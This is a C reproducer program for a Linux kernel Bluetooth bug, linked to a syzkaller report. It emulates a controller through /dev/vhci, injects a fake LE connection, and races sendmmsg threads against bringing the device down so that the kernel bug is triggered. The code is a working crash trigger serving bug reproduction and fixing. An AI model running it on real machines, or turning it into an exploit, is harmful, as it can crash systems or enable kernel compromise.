// https://syzkaller.appspot.com/bug?id=804b8b2ba268daf4e81ac6a21340991ad5ec8e5f
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <endian.h>
#include <sys/syscall.h>

#define AF_BLUETOOTH 31
#define BTPROTO_L2CAP 0
#define BTPROTO_HCI 1

#define HCIDEVUP    _IOW('H', 201, int)
#define HCIDEVDOWN  _IOW('H', 202, int)

struct sockaddr_l2 {
    sa_family_t l2_family;
    uint16_t    l2_psm;
    uint8_t     l2_bdaddr[6];
    uint16_t    l2_cid;
    uint8_t     l2_bdaddr_type;
};

int vhci_fd;
int hci_id;
int ctl;

void *vhci_thread(void *arg) {
    unsigned char buf[1024];
    while (1) {
        int n = read(vhci_fd, buf, sizeof(buf));
        if (n <= 0) continue;
        
        if (buf[0] == 0x01) { // HCI_COMMAND_PKT
            uint16_t opcode = buf[1] | (buf[2] << 8);
            
            if (opcode == 0x0c03) { // HCI_OP_RESET
                unsigned char resp[] = { 0x04, 0x0E, 0x04, 0x01, 0x03, 0x0C, 0x00 };
                write(vhci_fd, resp, sizeof(resp));
            } else if (opcode == 0x1003) { // HCI_OP_READ_LOCAL_FEATURES
                unsigned char resp[] = {
                    0x04, 0x0E, 0x0C, 0x01, 0x03, 0x10, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00 // LMP_LE | LMP_NO_BREDR
                };
                write(vhci_fd, resp, sizeof(resp));
            } else if (opcode == 0x1001) { // HCI_OP_READ_LOCAL_VERSION
                unsigned char resp[] = {
                    0x04, 0x0E, 0x0C, 0x01, 0x01, 0x10, 0x00,
                    0x06, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00
                };
                write(vhci_fd, resp, sizeof(resp));
            } else if (opcode == 0x1009) { // HCI_OP_READ_BD_ADDR
                unsigned char resp[] = {
                    0x04, 0x0E, 0x0A, 0x01, 0x09, 0x10, 0x00,
                    0x01, 0x02, 0x03, 0x04, 0x05, 0x06
                };
                write(vhci_fd, resp, sizeof(resp));
            } else if (opcode == 0x1002) { // HCI_OP_READ_LOCAL_COMMANDS
                unsigned char resp[71] = {
                    0x04, 0x0E, 68, 0x01, 0x02, 0x10, 0x00
                };
                memset(resp + 7, 0, 64); // No optional commands supported
                write(vhci_fd, resp, sizeof(resp));
            } else if (opcode == 0x2003) { // HCI_OP_LE_READ_LOCAL_FEATURES
                unsigned char resp[] = {
                    0x04, 0x0E, 0x0C, 0x01, 0x03, 0x20, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
                };
                write(vhci_fd, resp, sizeof(resp));
            } else if (opcode == 0x2002) { // HCI_OP_LE_READ_BUFFER_SIZE
                unsigned char resp[] = {
                    0x04, 0x0E, 0x07, 0x01, 0x02, 0x20, 0x00,
                    0x1B, 0x00, 0x01
                };
                write(vhci_fd, resp, sizeof(resp));
            } else if (opcode == 0x201c) { // HCI_OP_LE_READ_SUPPORTED_STATES
                unsigned char resp[] = {
                    0x04, 0x0E, 0x0C, 0x01, 0x1C, 0x20, 0x00,
                    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF
                };
                write(vhci_fd, resp, sizeof(resp));
            } else if (opcode == 0x0c01 || opcode == 0x2001) { // SET_EVENT_MASK
                unsigned char resp[] = {
                    0x04, 0x0E, 0x04, 0x01, buf[1], buf[2], 0x00
                };
                write(vhci_fd, resp, sizeof(resp));
            } else {
                // Generic command complete with 1 byte payload (status 0)
                unsigned char resp[] = {
                    0x04, 0x0E, 0x04, 0x01, buf[1], buf[2], 0x00
                };
                write(vhci_fd, resp, sizeof(resp));
            }
        }
    }
    return NULL;
}

void *send_thread(void *arg) {
    int sock = *(int *)arg;
    char buf[1] = {0};
    struct iovec iov = { .iov_base = buf, .iov_len = 1 };
    struct mmsghdr msg[10];
    for (int i = 0; i < 10; i++) {
        memset(&msg[i], 0, sizeof(msg[i]));
        msg[i].msg_hdr.msg_iov = &iov;
        msg[i].msg_hdr.msg_iovlen = 1;
    }
    
    for (int i = 0; i < 500; i++) {
        int res = syscall(SYS_sendmmsg, sock, msg, 10, MSG_DONTWAIT);
        if (res < 0) {
            if (errno != EAGAIN && errno != EWOULDBLOCK && errno != ENETDOWN && errno != ECONNRESET && errno != ENOTCONN && errno != EBADF && errno != EINVAL) {
                // Ignore expected errors during race
            }
        }
    }
    return NULL;
}

void *down_thread(void *arg) {
    usleep(1000); // 1ms delay to let send start queueing work
    int res = ioctl(ctl, HCIDEVDOWN, hci_id);
    if (res < 0 && errno != EALREADY) {
        printf("[-] Failed to HCIDEVDOWN: %s\n", strerror(errno));
    } else {
        printf("[+] HCIDEVDOWN successful.\n");
    }
    return NULL;
}

int main() {
    vhci_fd = open("/dev/vhci", O_RDWR);
    if (vhci_fd < 0) {
        printf("[-] Failed to open /dev/vhci: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] open /dev/vhci successful.\n");

    unsigned char create_req[] = { 0xff, 0x00 };
    if (write(vhci_fd, create_req, sizeof(create_req)) < 0) {
        printf("[-] Failed to write create_req: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] write create_req successful.\n");

    unsigned char buf[4];
    if (read(vhci_fd, buf, sizeof(buf)) < 0) {
        printf("[-] Failed to read hci_id: %s\n", strerror(errno));
        exit(1);
    }
    hci_id = buf[2] | (buf[3] << 8);
    printf("[+] read hci_id successful: %d\n", hci_id);

    pthread_t vtid;
    if (pthread_create(&vtid, NULL, vhci_thread, NULL) != 0) {
        printf("[-] Failed to create vhci_thread\n");
        exit(1);
    }
    printf("[+] create vhci_thread successful.\n");

    ctl = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI);
    if (ctl < 0) {
        printf("[-] Failed to create HCI socket: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] create HCI socket successful.\n");

    for (int iter = 0; iter < 10; iter++) {
        printf("[*] Iteration %d\n", iter);
        ioctl(ctl, HCIDEVDOWN, hci_id);
        
        if (ioctl(ctl, HCIDEVUP, hci_id) < 0 && errno != EALREADY) {
            printf("[-] Failed to HCIDEVUP: %s\n", strerror(errno));
            usleep(100000);
            continue;
        }
        printf("[+] HCIDEVUP successful.\n");

        int sock = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
        if (sock < 0) {
            printf("[-] Failed to create L2CAP socket: %s\n", strerror(errno));
            exit(1);
        }
        printf("[+] create L2CAP socket successful.\n");

        struct sockaddr_l2 addr = {0};
        addr.l2_family = AF_BLUETOOTH;
        addr.l2_bdaddr_type = 1; // BDADDR_LE_PUBLIC
        addr.l2_cid = htole16(4); // L2CAP_CID_ATT
        
        if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            printf("[-] Failed to bind L2CAP socket: %s\n", strerror(errno));
            close(sock);
            exit(1);
        }
        printf("[+] bind L2CAP socket successful.\n");

        if (listen(sock, 1) < 0) {
            printf("[-] Failed to listen L2CAP socket: %s\n", strerror(errno));
            close(sock);
            exit(1);
        }
        printf("[+] listen L2CAP socket successful.\n");

        // Inject LE Connection Complete
        unsigned char le_conn_complete[] = {
            0x04, 0x3E, 0x13, 
            0x01, 0x00, 0x42, 0x00, 0x01, 0x00, 
            0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 
            0x24, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00
        };
        if (write(vhci_fd, le_conn_complete, sizeof(le_conn_complete)) < 0) {
            printf("[-] Failed to write le_conn_complete: %s\n", strerror(errno));
            close(sock);
            exit(1);
        }
        printf("[+] write le_conn_complete successful.\n");

        // Accept the connection
        struct timeval tv = {1, 0};
        if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0) {
            printf("[-] Failed to setsockopt SO_RCVTIMEO: %s\n", strerror(errno));
            close(sock);
            exit(1);
        }
        
        int client_sock = accept(sock, NULL, NULL);
        if (client_sock < 0) {
            printf("[-] Failed to accept L2CAP socket: %s\n", strerror(errno));
            close(sock);
            continue;
        }
        printf("[+] accept L2CAP socket successful.\n");

        pthread_t stid[4], dtid;
        for (int i = 0; i < 4; i++) {
            if (pthread_create(&stid[i], NULL, send_thread, &client_sock) != 0) {
                printf("[-] Failed to create send_thread\n");
            }
        }
        if (pthread_create(&dtid, NULL, down_thread, NULL) != 0) {
            printf("[-] Failed to create down_thread\n");
        }

        for (int i = 0; i < 4; i++)
            pthread_join(stid[i], NULL);
        pthread_join(dtid, NULL);

        close(client_sock);
        close(sock);
    }
    
    printf("[+] Reproducer finished.\n");
    sleep(1);
    return 0;
}
